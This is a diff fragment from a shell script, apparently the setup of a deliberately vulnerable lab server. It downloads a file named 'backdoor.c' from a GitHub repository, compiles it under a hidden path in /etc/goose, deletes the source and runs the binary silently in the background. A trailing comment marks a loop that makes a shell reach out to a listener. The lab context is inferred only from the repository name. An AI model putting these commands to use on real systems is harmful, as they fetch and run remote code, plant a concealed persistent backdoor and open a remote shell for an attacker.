@@ -86,9 +86,12 @@ EOF
 sudo curl -s -o /etc/goose/.golden_egg.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
 
 # Compile and remove source code
-gcc -o /etc/goose/.golden_egg /etc/goose/.golden_egg.c
+gcc -o /etc/goose/golden_egg /etc/goose/.golden_egg.c
 rm /etc/goose/.golden_egg.c
-nohup /etc/goose./golden_egg &
+
+# Run the binary in background
+nohup /etc/goose/golden_egg </dev/null >/dev/null 2>&1 &
+
 
 # Setup Script Shell reach out to listener
 while true; do
